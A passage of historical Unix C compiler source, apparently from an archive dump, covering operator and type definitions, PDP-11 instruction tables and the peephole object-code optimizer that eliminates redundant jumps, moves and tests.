	char	*str2;
};

struct	swtab {
	int	swlab;
	int	swval;
};

char	maprel[];
char	notrel[];
int	nreg;
int	isn;
int	namsiz;
int	line;
char	ascbuf[518];
int	nerror;
struct	table	cctab[];
struct	table	efftab[];
struct	table	regtab[];
struct	table	sptab[];
struct	table	lsptab[];
struct	instab	instab[];
struct	instab	branchtab[];
int	opdope[];
char	*opntab[];
int	nstack;
int	nfloat;
int	*spacep;
int	treespace[ossiz];
int	eolflg;
struct tconst czero, cone, fczero;

/*
	operators
*/
#define	EOF	0
#define	SEMI	1
#define	LBRACE	2
#define	RBRACE	3
#define	LBRACK	4
#define	RBRACK	5
#define	LPARN	6
#define	RPARN	7
#define	COLON	8
#define	COMMA	9
#define	FSEL	10

#define	KEYW	19
#define	NAME	20
#define	CON	21
#define	STRING	22
#define	FCON	23
#define	SFCON	24

#define	AUTOI	27
#define	AUTOD	28
#define	INCBEF	30
#define	DECBEF	31
#define	INCAFT	32
#define	DECAFT	33
#define	EXCLA	34
#define	AMPER	35
#define	STAR	36
#define	NEG	37
#define	COMPL	38

#define	DOT	39
#define	PLUS	40
#define	MINUS	41
#define	TIMES	42
#define	DIVIDE	43
#define	MOD	44
#define	RSHIFT	45
#define	LSHIFT	46
#define	AND	47
#define	NAND	55
#define	OR	48
#define	EXOR	49
#define	ARROW	50
#define	ITOF	51
#define	FTOI	52
#define	LOGAND	53
#define	LOGOR	54
#define	FTOL	56
#define	LTOF	57
#define	ITOL	58
#define	LTOI	59

#define	EQUAL	60
#define	NEQUAL	61
#define	LESSEQ	62
#define	LESS	63
#define	GREATEQ	64
#define	GREAT	65
#define	LESSEQP	66
#define	LESSP	67
#define	GREATQP	68
#define	GREATP	69

#define	ASPLUS	70
#define	ASMINUS	71
#define	ASTIMES	72
#define	ASDIV	73
#define	ASMOD	74
#define	ASRSH	75
#define	ASLSH	76
#define	ASSAND	77
#define	ASOR	78
#define	ASXOR	79
#define	ASSIGN	80
#define	TAND	81
#define	LTIMES	82
#define	LDIV	83
#define	LMOD	84
#define	ASSNAND	85
#define	LASTIMES 86
#define	LASDIV	87
#define	LASMOD	88

#define	QUEST	90
#define	LLSHIFT	91
#define	ASLSHL	92
#define	CALL1	98
#define	CALL2	99
#define	CALL	100
#define	MCALL	101
#define	JUMP	102
#define	CBRANCH	103
#define	INIT	104
#define	SETREG	105
#define	LOAD	106
#define	RFORCE	110

/*
 * Intermediate code operators
 */
#define	BRANCH	111
#define	LABEL	112
#define	NLABEL	113
#define	RLABEL	114
#define	BDATA	200
#define	WDATA	201
#define	PROG	202
#define	DATA	203
#define	BSS	204
#define	CSPACE	205
#define	SSPACE	206
#define	SYMDEF	207
#define	SAVE	208
#define	RETRN	209
#define	EVEN	210
#define	PROFIL	212
#define	SWIT	213
#define	EXPR	214
#define	SNAME	215
#define	RNAME	216
#define	ANAME	217
#define	NULL	218

/*
 *	types
 */
#define	INT	0
#define	CHAR	1
#define	FLOAT	2
#define	DOUBLE	3
#define	STRUCT	4
#define	RSTRUCT	5
#define	LONG	6

#define	TYLEN	2
#define	TYPE	07
#define	XTYPE	(03<<3)
#define	PTR	010
#define	FUNC	020
#define	ARRAY	030

/*
	storage	classes
*/
#define	KEYWC	1
#define	MOS	10
#define	AUTO	11
#define	EXTERN	12
#define	STATIC	13
#define	REG	14
#define	STRTAG	15
#define	ARG	16
#define	OFFS	20
#define	XOFFS	21
#define	SOFFS	22

/*
	Flag	bits
*/

#define	BINARY	01
#define	LVALUE	02
#define	RELAT	04
#define	ASSGOP	010
#define	LWORD	020
#define	RWORD	040
#define	COMMUTE	0100
#define	RASSOC	0200
#define	LEAF	0400
#define	CNVRT	01000
-- /usr/source/c/c1t.s mode=0100644 uid=10 gid=1 atime=174920564 mtime=174910915 --
/ C operator tables

.globl fltused; fltused=.
.globl	_instab
.globl	_branchtab

.data
_instab:
	80.; 1f; 2f; .text; 1:<mov\0>; 2:<clr\0>; .data
	60.; 1f; 2f; .text; 1: <cmp\0>; 2: <tst\0>; .data
	106.; 1b; 2b
	61.; 1b; 2b
	62.; 1b; 2b
	63.; 1b; 2b
	64.; 1b; 2b
	65.; 1b; 2b
	66.; 1b; 2b
	67.; 1b; 2b
	68.; 1b; 2b
	69.; 1b; 2b
	40.; 1f; 3f; .text; 1:<add\0>; .data
	70.; 1b; 3f
	41.; 2f; 4f; .text; 2:<sub\0>; .data
	71.; 2b; 4f
	30.; 1b; 3f; .text; 3:<inc\0>; .data
	31.; 2b; 4f; .text; 4:<dec\0>; .data
	32.; 1b; 3b
	33.; 2b; 4b
	42.; 5f; 5f; .text; 5:<mul>; .data
	72.; 5b; 5b
	43.; 6f; 6f; .text; 6:<div\0>; .data
	73.; 6b; 6b
	44.; 5b; 6b
	74.; 5b; 6b
	45.; 5f; 6f; .text; 	6:<asr\0>; .data
	75.; 5f; 6b
	46.; 5f; 6f; .text; 5:<ash\0>; 6:<asl\0>; .data
	76.; 5b; 6b
	47.; 5f; 5f; .text; 5:<bic\0>; 6:<bic $1,\0>; .data
	55.; 5b; 6b
	85.; 5b; 6b
	81.; 5f; 6f; .text; 5:<bit\0>; 6:<bit $1,\0>; .data
	48.; 5f; 6f; .text; 5:<bis\0>; 6:<bis $1,\0>; .data
	78.; 5b; 6b
	49.; 5f; 5f; .text; 5:<xor\0>; .data
	79.; 5b; 5b
	37.; 1f; 1f; .text; 1:<neg\0>; .data
	38.; 1f; 1f; .text; 1:<com\0>; .data

	98.; 1f; 1f; .text; 1:<*$\0>; .data
	99.; 1b+2; 1b+2
	91.; 1f; 1f; .text; 1: <ashc\0>; .data
	92.; 1b; 1b
	82.; 1f; 1f; .text; 1:<lmul\0>; .data
	83.; 1f; 1f; .text; 1:<ldiv\0>; .data
	84.; 1f; 1f; .text; 1:<lrem\0>; .data
	86.; 1f; 1f; .text; 1:<almul\0>; .data
	87.; 1f; 1f; .text; 1:<aldiv\0>; .data
	88.; 1f; 1f; .text; 1:<alrem\0>; .data
	0

.data
_branchtab:
	60.; 0f; 1f; .text; 0:<jeq\0>; 1:<jne\0>; .data
	61.; 1b; 0b
	62.; 2f; 5f; .text; 2:<jle\0>; 5:<jgt\0>; .data
	63.; 3f; 4f; .text; 3:<jlt\0>; 4:<jge\0>; .data
	64.; 4b; 3b
	65.; 5b; 2b
	66.; 6f; 9f; .text; 6:<jlos\0>; 9:<jhi\0>; .data
	67.; 7f; 8f; .text; 7:<jlo\0>; 8:<jhis\0>; .data
	68.; 8b; 7b
	69.; 9b; 6b

	260.; 0b; 1b
	261.; 1b; 0b
	262.; 2b; 5b
	263.; 3b; 4b
	264.; 4b; 3b
	265.; 5b; 2b
	266.; 0b; 1b
	267.; 7f; 8f; .text; 7:</nop\0>; 8:<jbr\0>; .data
	268.; 8b; 7b
	269.; 1b; 0b
	0
-- /usr/source/c/c20.c mode=0110644 uid=10 gid=1 atime=174920592 mtime=174910921 --
#
/*
 *	 C object code improver
 */

#include "c2h.c"

struct optab optab[] {
	"jbr",	JBR,
	"jeq",	CBR | JEQ<<8,
	"jne",	CBR | JNE<<8,
	"jle",	CBR | JLE<<8,
	"jge",	CBR | JGE<<8,
	"jlt",	CBR | JLT<<8,
	"jgt",	CBR | JGT<<8,
	"jlo",	CBR | JLO<<8,
	"jhi",	CBR | JHI<<8,
	"jlos",	CBR | JLOS<<8,
	"jhis",	CBR | JHIS<<8,
	"jmp",	JMP,
	".globl",EROU,
	"mov",	MOV,
	"clr",	CLR,
	"com",	COM,
	"inc",	INC,
	"dec",	DEC,
	"neg",	NEG,
	"tst",	TST,
	"asr",	ASR,
	"asl",	ASL,
	"sxt",	SXT,
	"cmp",	CMP,
	"add",	ADD,
	"sub",	SUB,
	"bit",	BIT,
	"bic",	BIC,
	"bis",	BIS,
	"mul",	MUL,
	"ash",	ASH,
	"xor",	XOR,
	".text",TEXT,
	".data",DATA,
	".bss",	BSS,
	".even",EVEN,
	"movf",	MOVF,
	"movof",MOVOF,
	"movfo",MOVFO,
	"addf",	ADDF,
	"subf",	SUBF,
	"divf",	DIVF,
	"mulf",	MULF,
	"clrf",	CLRF,
	"cmpf",	CMPF,
	"negf",	NEGF,
	"tstf",	TSTF,
	"cfcc",	CFCC,
	"sob",	SOB,
	"jsr",	JSR,
	".end",	END,
	0,	0};

char	revbr[] { JNE, JEQ, JGT, JLT, JGE, JLE, JHIS, JLOS, JHI, JLO };
int	isn	20000;

main(argc, argv)
char **argv;
{
	register int niter, maxiter, isend;
	extern end;
	extern fin, fout;
	int nflag;

	if (argc>1 && argv[1][0]=='+') {
		argc--;
		argv++;
		debug++;
	}
	if (argc>1 && argv[1][0]=='-') {
		argc--;
		argv++;
		nflag++;
	}
	if (argc>1) {
		if ((fin = open(argv[1], 0)) < 0) {
			printf("C2: can't find %s\n", argv[1]);
			exit(1);
		}
	} else
		fin = dup(0);
	if (argc>2) {
		if ((fout = creat(argv[2], 0666)) < 0) {
			fout = 1;
			printf("C2: can't create %s\n", argv[2]);
			exit(1);
		}
	} else
		fout = dup(1);
	lasta = firstr = lastr = sbrk(2);
	maxiter = 0;
	opsetup();
	do {
		isend = input();
		movedat();
		niter = 0;
		do {
			refcount();
			do {
				iterate();
				clearreg();
				niter++;
			} while (nchange);
			comjump();
			rmove();
		} while (nchange || jumpsw());
		addsob();
		output();
		if (niter > maxiter)
			maxiter = niter;
		lasta = firstr;
	} while (isend);
	flush();
	fout = 2;
	if (nflag) {
		printf("%d iterations\n", maxiter);
		printf("%d jumps to jumps\n", nbrbr);
		printf("%d inst. after jumps\n", iaftbr);
		printf("%d jumps to .+2\n", njp1);
		printf("%d redundant labels\n", nrlab);
		printf("%d cross-jumps\n", nxjump);
		printf("%d code motions\n", ncmot);
		printf("%d branches reversed\n", nrevbr);
		printf("%d redundant moves\n", redunm);
		printf("%d simplified addresses\n", nsaddr);
		printf("%d loops inverted\n", loopiv);
		printf("%d redundant jumps\n", nredunj);
		printf("%d common seqs before jmp's\n", ncomj);
		printf("%d skips over jumps\n", nskip);
		printf("%d sob's added\n", nsob);
		printf("%d redundant tst's\n", nrtst);
		printf("%d literals eliminated\n", nlit);
		printf("%dK core\n", ((lastr+01777)>>10)&077);
		flush();
	}
	exit(0);
}

input()
{
	register struct node *p, *lastp;
	register int op;

	lastp = &first;
	for (;;) {
		op = getline();
		switch (op.op) {
	
		case LABEL:
			p = alloc(sizeof first);
			if (line[0] == 'L') {
				p->combop = LABEL;
				p->labno = getnum(line+1);
				p->code = 0;
			} else {
				p->combop = DLABEL;
				p->labno = 0;
				p->code = copy(line);
			}
			break;
	
		case JBR:
		case CBR:
		case JMP:
		case JSW:
			p = alloc(sizeof first);
			p->combop = op;
			if (*curlp=='L' && (p->labno = getnum(curlp+1)))
				p->code = 0;
			else {
				p->labno = 0;
				p->code = copy(curlp);
			}
			break;

		default:
			p = alloc(sizeof first);
			p->combop = op;
			p->labno = 0;
			p->code = copy(curlp);
			break;

		}
		p->forw = 0;
		p->back = lastp;
		lastp->forw = p;
		lastp = p;
		p->ref = 0;
		if (op==EROU)
			return(1);
		if (op==END)
			return(0);
	}
}

getline()
{
	register char *lp;
	register c;

	lp = line;
	while (c = getchar()) {
		if (c==':') {
			*lp++ = 0;
			return(LABEL);
		}
		if (c=='\n') {
			*lp++ = 0;
			return(oplook());
		}
		*lp++ = c;
	}
	*lp++ = 0;
	return(END);
}

getnum(ap)
char *ap;
{
	register char *p;
	register n, c;

	p = ap;
	n = 0;
	while ((c = *p++) >= '0' && c <= '9')
		n = n*10 + c - '0';
	if (*--p != 0)
		return(0);
	return(n);
}

output()
{
	register struct node *t;
	register struct optab *op;
	register int byte;

	t = &first;
	while (t = t->forw) switch (t->op) {

	case END:
		return;

	case LABEL:
		printf("L%d:", t->labno);
		continue;

	case DLABEL:
		printf("%s:", t->code);
		continue;

	default:
		if ((byte = t->subop) == BYTE)
			t->subop = 0;
		for (op = optab; op->opstring!=0; op++) 
			if (op->opcode == t->combop) {
				printf("%s", op->opstring);
				if (byte==BYTE)
					printf("b");
				break;
			}
		if (t->code) {
			reducelit(t);
			printf("\t%s\n", t->code);
		} else if (t->op==JBR || t->op==CBR)
			printf("\tL%d\n", t->labno);
		else
			printf("\n");
		continue;

	case JSW:
		printf("L%d\n", t->labno);
		continue;

	case SOB:
		printf("sob	%s,L%d\n", t->code, t->labno);
		continue;

	case 0:
		if (t->code)
			printf("%s", t->code);
		printf("\n");
		continue;
	}
}

/*
 * Notice addresses of the form
 * $xx,xx(r)
 * and replace them with (pc),xx(r)
 *     -- Thanx and a tip of the Hatlo hat to Bliss-11.
 */
reducelit(at)
struct node *at;
{
	register char *c1, *c2;
	char *c2s;
	register struct node *t;

	t = at;
	if (*t->code != '$')
		return;
	c1 = t->code;
	while (*c1 != ',')
		if (*c1++ == '\0')
			return;
	c2s = c1;
	c1++;
	if (*c1=='*')
		c1++;
	c2 = t->code+1;
	while (*c1++ == *c2++);
	if (*--c1!='(' || *--c2!=',')
		return;
	t->code = copy("(pc)", c2s);
	nlit++;
}

copy(ap)
char *ap;
{
	register char *p, *np;
	char *onp;
	register n;
	int na;

	na = nargs();
	p = ap;
	n = 0;
	if (*p==0)
		return(0);
	do
		n++;
	while (*p++);
	if (na>1) {
		p = (&ap)[1];
		while (*p++)
			n++;
	}
	onp = np = alloc(n);
	p = ap;
	while (*np++ = *p++);
	if (na>1) {
		p = (&ap)[1];
		np--;
		while (*np++ = *p++);
	}
	return(onp);
}

opsetup()
{
	register struct optab *optp, **ophp;
	register char *p;

	for (optp = optab; p = optp->opstring; optp++) {
		ophp = &ophash[(((p[0]<<3)+(p[1]<<1)+p[2])&077777) % OPHS];
		while (*ophp++)
			if (ophp > &ophash[OPHS])
				ophp = ophash;
		*--ophp = optp;
	}
}

oplook()
{
	register struct optab *optp;
	register char *lp, *op;
	static char tmpop[32];
	struct optab **ophp;

	op = tmpop;
	for (lp = line; *lp && *lp!=' ' && *lp!='\t';)
		*op++ = *lp++;
	*op++ = 0;
	while (*lp=='\t' || *lp==' ')
		lp++;
	curlp = lp;
	ophp = &ophash[(((tmpop[0]<<3)+(tmpop[1]<<1)+tmpop[2])&077777) % OPHS];
	while (optp = *ophp) {
		op = optp->opstring;
		lp = tmpop;
		while (*lp == *op++)
			if (*lp++ == 0)
				return(optp->opcode);
		if (*lp++=='b' && *lp++==0 && *--op==0)
			return(optp->opcode + (BYTE<<8));
		ophp++;
		if (ophp >= &ophash[OPHS])
			ophp = ophash;
	}
	if (line[0]=='L') {
		lp = &line[1];
		while (*lp)
			if (*lp<'0' || *lp++>'9')
				return(0);
		curlp = line;
		return(JSW);
	}
	curlp = line;
	return(0);
}

refcount()
{
	register struct node *p, *lp;
	static struct node *labhash[LABHS];
	register struct node **hp;

	for (hp = labhash; hp < &labhash[LABHS];)
		*hp++ = 0;
	for (p = first.forw; p!=0; p = p->forw)
		if (p->op==LABEL) {
			labhash[p->labno % LABHS] = p;
			p->refc = 0;
		}
	for (p = first.forw; p!=0; p = p->forw) {
		if (p->op==JBR || p->op==CBR || p->op==JSW) {
			p->ref = 0;
			lp = labhash[p->labno % LABHS];
			if (lp==0 || p->labno!=lp->labno)
			for (lp = first.forw; lp!=0; lp = lp->forw) {
				if (lp->op==LABEL && p->labno==lp->labno)
					break;
			}
			if (lp) {
				hp = nonlab(lp)->back;
				if (hp!=lp) {
					p->labno = hp->labno;
					lp = hp;
				}
				p->ref = lp;
				lp->refc++;
			}
		}
	}
	for (p = first.forw; p!=0; p = p->forw)
		if (p->op==LABEL && p->refc==0
		 && (lp = nonlab(p))->op && lp->op!=JSW)
			decref(p);
}

iterate()
{
	register struct node *p, *rp, *p1;

	nchange = 0;
	for (p = first.forw; p!=0; p = p->forw) {
		if ((p->op==JBR||p->op==CBR||p->op==JSW) && p->ref) {
			rp = nonlab(p->ref);
			if (rp->op==JBR && rp->labno && p!=rp) {
				nbrbr++;
				p->labno = rp->labno;
				decref(p->ref);
				rp->ref->refc++;
				p->ref = rp->ref;
				nchange++;
			}
		}
		if (p->op==CBR && (p1 = p->forw)->op==JBR) {
			rp = p->ref;
			do
				rp = rp->back;
			while (rp->op==LABEL);
			if (rp==p1) {
				decref(p->ref);
				p->ref = p1->ref;
				p->labno = p1->labno;
				p1->forw->back = p;
				p->forw = p1->forw;
				p->subop = revbr[p->subop];
				nchange++;
				nskip++;
			}
		}
		if (p->op==JBR || p->op==JMP) {
			while (p->forw && p->forw->op!=LABEL
				&& p->forw->op!=EROU && p->forw->op!=END) {
				nchange++;
				iaftbr++;
				if (p->forw->ref)
					decref(p->forw->ref);
				p->forw = p->forw->forw;
				p->forw->back = p;
			}
			rp = p->forw;
			while (rp && rp->op==LABEL) {
				if (p->ref == rp) {
					p->back->forw = p->forw;
					p->forw->back = p->back;
					p = p->back;
					decref(rp);
					nchange++;
					njp1++;
					break;
				}
				rp = rp->forw;
			}
			xjump(p);
			p = codemove(p);
		}
	}
}

xjump(ap)
{
	register int *p1, *p2, *p3;
	int nxj;

	nxj = 0;
	p1 = ap;
	if ((p2 = p1->ref)==0)
		return(0);
	for (;;) {
		while ((p1 = p1->back) && p1->op==LABEL);
		while ((p2 = p2->back) && p2->op==LABEL);
		if (!equop(p1, p2) || p1==p2)
			return(nxj);
		p3 = insertl(p2);
		p1->combop = JBR;
		p1->ref = p3;
		p1->labno = p3->labno;
		p1->code = 0;
		nxj++;
		nxjump++;
		nchange++;
	}
}

insertl(ap)
struct node *ap;
{
	register struct node *lp, *op;

	op = ap;
	if (op->op == LABEL) {
		op->refc++;
		return(op);
	}
	if (op->back->op == LABEL) {
		op = op->back;
		op->refc++;
		return(op);
	}
	lp = alloc(sizeof first);
	lp->combop = LABEL;
	lp->labno = isn++;
	lp->ref = 0;
	lp->code = 0;
	lp->refc = 1;
	lp->back = op->back;
	lp->forw = op;
	op->back->forw = lp;
	op->back = lp;
	return(lp);
}

codemove(ap)
struct node *ap;
{
	register struct node *p1, *p2, *p3;
	struct node *t, *tl;
	int n;

	p1 = ap;
	if (p1->op!=JBR || (p2 = p1->ref)==0)
		return(p1);
	while (p2->op == LABEL)
		if ((p2 = p2->back) == 0)
			return(p1);
	if (p2->op!=JBR && p2->op!=JMP)
		goto ivloop;
	p2 = p2->forw;
	p3 = p1->ref;
	while (p3) {
		if (p3->op==JBR || p3->op==JMP) {
			if (p1==p3)
				return(p1);
			ncmot++;
			nchange++;
			p1->back->forw = p2;
			p1->forw->back = p3;
			p2->back->forw = p3->forw;
			p3->forw->back = p2->back;
			p2->back = p1->back;
			p3->forw = p1->forw;
			decref(p1->ref);
			return(p2);
		} else
			p3 = p3->forw;
	}
	return(p1);
ivloop:
	if (p1->forw->op!=LABEL)
		return(p1);
	p3 = p2 = p2->forw;
	n = 16;
	do {
		if ((p3 = p3->forw) == 0 || p3==p1 || --n==0)
			return(p1);
	} while (p3->op!=CBR || p3->labno!=p1->forw->labno);
	do 
		if ((p1 = p1->back) == 0)
			return(ap);
	while (p1!=p3);
	p1 = ap;
	tl = insertl(p1);
	p3->subop = revbr[p3->subop];
	decref(p3->ref);
	p2->back->forw = p1;
	p3->forw->back = p1;
	p1->back->forw = p2;
	p1->forw->back = p3;
	t = p1->back;
	p1->back = p2->back;
	p2->back = t;
	t = p1->forw;
	p1->forw = p3->forw;
	p3->forw = t;
	p2 = insertl(p1->forw);
	p3->labno = p2->labno;
	p3->ref = p2;
	decref(tl);
	if (tl->refc<=0)
		nrlab--;
	loopiv++;
	nchange++;
	return(p3);
}

comjump()
{
	register struct node *p1, *p2, *p3;

	for (p1 = first.forw; p1!=0; p1 = p1->forw)
		if (p1->op==JBR && (p2 = p1->ref) && p2->refc > 1)
			for (p3 = p1->forw; p3!=0; p3 = p3->forw)
				if (p3->op==JBR && p3->ref == p2)
					backjmp(p1, p3);
}

backjmp(ap1, ap2)
struct node *ap1, *ap2;
{
	register struct node *p1, *p2, *p3;

	p1 = ap1;
	p2 = ap2;
	for(;;) {
		while ((p1 = p1->back) && p1->op==LABEL);
		p2 = p2->back;
		if (equop(p1, p2)) {
			p3 = insertl(p1);
			p2->back->forw = p2->forw;
			p2->forw->back = p2->back;
			p2 = p2->forw;
			decref(p2->ref);
			p2->labno = p3->labno;
			p2->ref = p3;
			nchange++;
			ncomj++;
		} else
			return;
	}
}
-- /usr/source/c/c21.c mode=0110644 uid=10 gid=1 atime=174920615 mtime=174910926 --
#
/*
 * C object code improver-- second part
 */

#include "c2h.c"

rmove()
{
	register struct node *p;
	register char *cp;
	register int r;
	int r1, flt;

	for (p=first.forw; p!=0; p = p->forw) {
	if (debug) {
		for (r=0; r<2*NREG; r++)
			if (regs[r][0])
				printf("%d: %s\n", r, regs[r]);
		printf("-\n");
	}
	flt = 0;
	switch (p->op) {

	case MOVF:
	case MOVFO:
	case MOVOF:
		flt = NREG;

	case MOV:
		if (p->subop==BYTE)
			goto badmov;
		dualop(p);
		if ((r = findrand(regs[RT1], flt)) >= 0) {
			if (r == flt+isreg(regs[RT2]) && p->forw->op!=CBR) {
				p->forw->back = p->back;
				p->back->forw = p->forw;
				redunm++;
				continue;
			}
		}
		repladdr(p, 0, flt);
		r = isreg(regs[RT1]);
		r1 = isreg(regs[RT2]);
		dest(regs[RT2], flt);
		if (r >= 0)
			if (r1 >= 0)
				savereg(r1+flt, regs[r+flt]);
			else
				savereg(r+flt, regs[RT2]);
		else
			if (r1 >= 0)
				savereg(r1+flt, regs[RT1]);
			else
				setcon(regs[RT1], regs[RT2]);
		source(regs[RT1]);
		setcc(regs[RT2]);
		continue;

	case ADDF:
	case SUBF:
	case DIVF:
	case MULF:
		flt = NREG;

	case ADD:
	case SUB:
	case BIC:
	case BIS:
	case MUL:
	case DIV:
	case ASH:
	badmov:
		dualop(p);
		repladdr(p, 0, flt);
		source(regs[RT1]);
		dest(regs[RT2], flt);
		if (p->op==DIV && (r = isreg(regs[RT2])>=0))
			regs[r+1][0] = 0;
		ccloc[0] = 0;
		continue;

	case CLRF:
	case NEGF:
		flt = NREG;

	case CLR:
	case COM:
	case INC:
	case DEC:
	case NEG:
	case ASR:
	case ASL:
	case SXT:
		singop(p);
		dest(regs[RT1], flt);
		if (p->op==CLR && flt==0)
			if ((r = isreg(regs[RT1])) >= 0)
				savereg(r, "$0");
			else
				setcon("$0", regs[RT1]);
		setcc(regs[RT1]);
		continue;

	case TSTF:
		flt = NREG;

	case TST:
		singop(p);
		repladdr(p, 0, flt);
		source(regs[RT1]);
		if (equstr(regs[RT1], ccloc)) {
			p->back->forw = p->forw;
			p->forw->back = p->back;
			p = p->back;
			nrtst++;
			nchange++;
		}
		continue;

	case CMPF:
		flt = NREG;

	case CMP:
	case BIT:
		dualop(p);
		source(regs[RT1]);
		source(regs[RT2]);
		repladdr(p, 1, flt);
		ccloc[0] = 0;
		continue;

	case CBR:
	case CFCC:
		ccloc[0] = 0;
		continue;

	case JBR:
		redunbr(p);

	default:
		clearreg();
	}
	}
}

jumpsw()
{
	register struct node *p, *p1;
	register t;
	int nj;

	t = 0;
	nj = 0;
	for (p=first.forw; p!=0; p = p->forw)
		p->refc = ++t;
	for (p=first.forw; p!=0; p = p1) {
		p1 = p->forw;
		if (p->op == CBR && p1->op==JBR && p->ref && p1->ref
		 && abs(p->refc - p->ref->refc) > abs(p1->refc - p1->ref->refc)) {
			p->subop = revbr[p->subop];
			t = p1->ref;
			p1->ref = p->ref;
			p->ref = t;
			t = p1->labno;
			p1->labno = p->labno;
			p->labno = t;
			nrevbr++;
			nj++;
		}
	}
	return(nj);
}

addsob()
{
	register struct node *p, *p1;

	for (p = &first; (p1 = p->forw)!=0; p = p1) {
		if (p->op==DEC && isreg(p->code)>=0
		 && p1->combop==(CBR|JNE<<8)) {
			if (p->refc < p1->ref->refc)
				continue;
			if (p->refc - p1->ref->refc > 50)
				continue;
			p->labno = p1->labno;
			p->combop = SOB;
			p1->forw->back = p;
			p->forw = p1->forw;
			nsob++;
		}
	}
}

abs(x)
{
	return(x<0? -x: x);
}

equop(ap1, p2)
struct node *ap1, *p2;
{
	register char *cp1, *cp2;
	register struct node *p1;

	p1 = ap1;
	if (p1->combop != p2->combop)
		return(0);
	if (p1->op>0 && p1->op<MOV)
		return(0);
	cp1 = p1->code;
	cp2 = p2->code;
	if (cp1==0 && cp2==0)
		return(1);
	if (cp1==0 || cp2==0)
		return(0);
	while (*cp1 == *cp2++)
		if (*cp1++ == 0)
			return(1);
	return(0);
}

decref(ap)
{
	register struct node *p;

	p = ap;
	if (--p->refc <= 0) {
		nrlab++;
		p->back->forw = p->forw;
		p->forw->back = p->back;
	}
}

nonlab(ap)
struct node *ap;
{
	register struct node *p;

	p = ap;
	while (p && p->op==LABEL)
		p = p->forw;
	return(p);
}

alloc(an)
{
	register int n;
	register char *p;

	n = an;
	n++;
	n =& ~01;
	if (lasta+n >= lastr) {
		if (sbrk(2000) == -1) {
			write(2, "Optimizer: out of space\n", 14);
			exit(1);
		}
		lastr =+ 2000;
	}
	p = lasta;
	lasta =+ n;
	return(p);
}

clearreg()
{
	register int i;

	for (i=0; i<2*NREG; i++)
		regs[i][0] = '\0';
	conloc[0] = 0;
	ccloc[0] = 0;
}

savereg(ai, as)
char *as;
{
	register char *p, *s, *sp;

	sp = p = regs[ai];
	s = as;
	if (source(s))
		return;
	while (*p++ = *s) {
		if (s[0]=='(' && s[1]=='r' && s[2]<'5') {
			*sp = 0;
			return;
		}
		if (*s++ == ',')
			break;
	}
	*--p = '\0';
}

dest(as, flt)
char *as;
{
	register char *s;
	register int i;

	s = as;
	if ((i = isreg(s)) >= 0)
		regs[i+flt][0] = 0;
	while ((i = findrand(s, flt)) >= 0)
		regs[i][0] = 0;
	while (*s) {
		if ((*s=='(' && (*(s+1)!='r' || *(s+2)!='5')) || *s++=='*') {
			for (i=flt; i<flt+NREG; i++) {
				if (regs[i][0] != '$')
					regs[i][0] = 0;
				conloc[0] = 0;
			}
			return;
		}
	}
}

singop(ap)
struct node *ap;
{
	register char *p1, *p2;

	p1 = ap->code;
	p2 = regs[RT1];
	while (*p2++ = *p1++);
	regs[RT2][0] = 0;
}


dualop(ap)
struct node *ap;
{
	register char *p1, *p2;
	register struct node *p;

	p = ap;
	p1 = p->code;
	p2 = regs[RT1];
	while (*p1 && *p1!=',')
		*p2++ = *p1++;
	*p2++ = 0;
	p2 = regs[RT2];
	*p2 = 0;
	if (*p1++ !=',')
		return;
	while (*p2++ = *p1++);
}

findrand(as, flt)
char *as;
{
	register int i;
	for (i = flt; i<NREG+flt; i++) {
		if (equstr(regs[i], as))
			return(i);
	}
	return(-1);
}

isreg(as)
char *as;
{
	register char *s;

	s = as;
	if (s[0]=='r' && s[1]>='0' && s[1]<='4' && s[2]==0)
		return(s[1]-'0');
	return(-1);
}

check()
{
	register struct node *p, *lp;

	lp = &first;
	for (p=first.forw; p!=0; p = p->forw) {
		if (p->back != lp)
			abort();
		lp = p;
	}
}

source(ap)
char *ap;
{
	register char *p1, *p2;

	p1 = ap;
	p2 = p1;
	if (*p1==0)
		return(0);
	while (*p2++);
	if (*p1=='-' && *(p1+1)=='('
	 || *p1=='*' && *(p1+1)=='-' && *(p1+2)=='('
	 || *(p2-2)=='+') {
		while (*p1 && *p1++!='r');
		if (*p1>='0' && *p1<='4')
			regs[*p1 - '0'][0] = 0;
		return(1);
	}
	return(0);
}

repladdr(p, f, flt)
struct node *p;
{
	register r;
	int r1;
	register char *p1, *p2;
	static char rt1[50], rt2[50];

	if (f)
		r1 = findrand(regs[RT2], flt);
	else
		r1 = -1;
	r = findrand(regs[RT1], flt);
	if (r1 >= NREG)
		r1 =- NREG;
	if (r >= NREG)
		r =- NREG;
	if (r>=0 || r1>=0) {
		p2 = regs[RT1];
		for (p1 = rt1; *p1++ = *p2++;);
		if (regs[RT2][0]) {
			p1 = rt2;
			*p1++ = ',';
			for (p2 = regs[RT2]; *p1++ = *p2++;);
		} else
			rt2[0] = 0;
		if (r>=0) {
			rt1[0] = 'r';
			rt1[1] = r + '0';
			rt1[2] = 0;
			nsaddr++;
		}
		if (r1>=0) {
			rt2[1] = 'r';
			rt2[2] = r1 + '0';
			rt2[3] = 0;
			nsaddr++;
		}
		p->code = copy(rt1, rt2);
	}
}

movedat()
{
	register struct node *p1, *p2;
	struct node *p3;
	register seg;
	struct node data;
	struct node *datp;

	if (first.forw == 0)
		return;
	datp = &data;
	for (p1 = first.forw; p1!=0; p1 = p1->forw) {
		if (p1->op == DATA) {
			p2 = p1->forw;
			while (p2 && p2->op!=TEXT)
				p2 = p2->forw;
			if (p2==0)
				break;
			p3 = p1->back;
			p1->back->forw = p2->forw;
			p2->forw->back = p3;
			p2->forw = 0;
			datp->forw = p1;
			p1->back = datp;
			p1 = p3;
			datp = p2;
		}
	}
	if (data.forw) {
		datp->forw = first.forw;
		first.forw->back = datp;
		data.forw->back = &first;
		first.forw = data.forw;
	}
	seg = -1;
	for (p1 = first.forw; p1!=0; p1 = p1->forw) {
		if (p1->op==TEXT||p1->op==DATA||p1->op==BSS) {
			if (p1->op == seg || p1->forw&&p1->forw->op==seg) {
				p1->back->forw = p1->forw;
				p1->forw->back = p1->back;
				p1 = p1->back;
				continue;
			}
			seg = p1->op;
		}
	}
}

redunbr(ap)
struct node *ap;
{
	register struct node *p, *p1;
	register char *ap1;
	char *ap2;

	if ((p1 = p->ref) == 0)
		return;
	p1 = nonlab(p1);
	if (p1->op==TST) {
		singop(p1);
		savereg(RT2, "$0");
	} else if (p1->op==CMP)
		dualop(p1);
	else
		return;
	if (p1->forw->op!=CBR)
		return;
	ap1 = findcon(RT1);
	ap2 = findcon(RT2);
	p1 = p1->forw;
	if (compare(p1->subop, ap1, ap2)) {
		nredunj++;
		nchange++;
		decref(p->ref);
		p->ref = p1->ref;
